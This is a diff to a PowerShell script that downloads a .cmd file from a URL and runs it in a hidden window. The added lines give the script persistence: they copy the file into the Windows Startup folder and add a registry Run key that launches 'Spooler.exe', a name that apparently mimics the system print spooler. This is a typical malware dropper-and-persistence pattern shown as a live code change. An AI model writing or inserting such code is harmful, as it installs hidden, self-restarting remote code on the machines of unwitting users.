@@ -16,8 +16,22 @@ $cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")
 # Download the .cmd script from the URL
 Invoke-WebRequest -Uri $cmdScriptUrl -OutFile $cmdScriptPath
 
+# Add the shortcut to autostart
+$StartupFolder = [System.Environment]::GetFolderPath("Startup")
+Copy-Item "$downloadDirectory\play.cmd" "$StartupFolder\play.cmd"
+
+# Define the program path you want to start automatically
+$programPath = "$env:USERPROFILE\Library\Spooler.exe"
+
+# Define the registry key path
+$registryKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+
+# Define the name of the registry entry (without the file extension)
+$entryName = "Spooler"
+
+# Create the registry entry to run the program at startup
+New-ItemProperty -Path $registryKeyPath -Name $entryName -Value $programPath -PropertyType String
+
 # Execute the .cmd script with the window closed
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmdScriptPath" -WindowStyle Hidden
 
-# Add a delay (e.g., 10 seconds) to give the CMD script time to run
-Start-Sleep -Seconds 5
